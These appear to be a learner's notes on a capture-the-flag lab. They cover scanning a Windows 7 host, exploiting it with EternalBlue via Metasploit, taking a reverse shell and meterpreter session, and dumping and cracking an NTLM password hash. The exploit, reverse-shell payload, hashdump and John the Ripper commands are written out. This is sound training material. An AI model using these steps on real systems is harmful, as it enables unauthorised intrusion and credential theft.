## Reconnaissance 
- Did nmap search , nmap -T4 -p- -A -sV -sC 10.65.171.129 the result:
	- PORT      STATE    SERVICE       VERSION
		135/tcp   open     msrpc         Microsoft Windows RPC
		139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
		445/tcp   open     microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
		3389/tcp  open     ms-wbt-server Microsoft Terminal Service
	- smb2-security-mode: 
		 2.1: 
		  Message signing enabled but not required
		  smb-os-discovery: 
		  OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
	
	- smb-security-mode: 
		account_used: guest
		authentication_level: user
	    challenge_response: supported
		message_signing: disabled (dangerous, but default)
	- what does authentication_level:user means?
		- **What it means:** The system requires a valid username and password to access shared resources .
		- **Why it matters:** It's the standard configuration for Windows and is more secure than "share-level" authentication (where a single password protects a resource).
	- What does challenge_signing: supported means?
		- This means the system supports the older **NTLM authentication** protocol .
	- What does message_signing: disabled means?
		- **What it is:** Message signing is a security feature that cryptographically signs each SMB packet to prevent **man-in-the-middle (MITM) attacks**.
	- **Why it's dangerous:** Because signing is disabled, an attacker on the same network can intercept and modify SMB traffic between the client and server without being detected. This opens the door to attacks like **SMB Relay Attacks** .
## Gaining Access 
- Result from Metasploit:
	- 10.65.145.134:445     - SMB Detected (versions: 1, 2) (preferred dialect: SMB 2.1) (signatures: optional) (uptime: 13s) (guid: {952e42ba-5e5b-4f34-8171-83014f1470f3}) (authentication domain: JON-PC)
	- found on an exploit : exploit/windows/smb/ms17_010_eternalblue
		- Auxiliary(scanner/smb/smb_version) > use 0
		- No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
		- By default the payload was windows/x64/meterpreter/reverse_tcp.
		- That didn't work so had to change to set payload windows/x64/shell/reverse_tcp.
		- After that had to change the rhost but didn't change the **LHOST which was my wifi ip and because of that error was occuring. Had to change the LHOST to the THM VPN ip to make it work.**.
## Escalation
- Then background the shell (ctrl + z).
- Then convert the shell to meterpreter, Why?
	- Because the standard shell only let you run standard command while the meterpreter provides a powerful, specialized environment designed specifically for advanced post-exploitation.
	- to make it happen , use post/multi/manage/shell_to_meterpreter then set the session option to the id of the specific session.
	- Then after getting another session change to it , ssession -i ID.
- After that we can list all of the processes running via the 'ps' command.
- And then migrate to one of it by just using the id, migrate PROCESS_ID.
## Cracking
- Then after migrating we can dump all of the password as long as we are in the correct privilege , hashdump.
- And a list of user and password will come , "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d".
- We can crack the hash using john the ripper.
	- first we have t write the hash in a readable file , echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d" > jon.txt.
	- Then run John , john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon.txt.
	- Then we can get the password by john --show --format=nt jon.txt.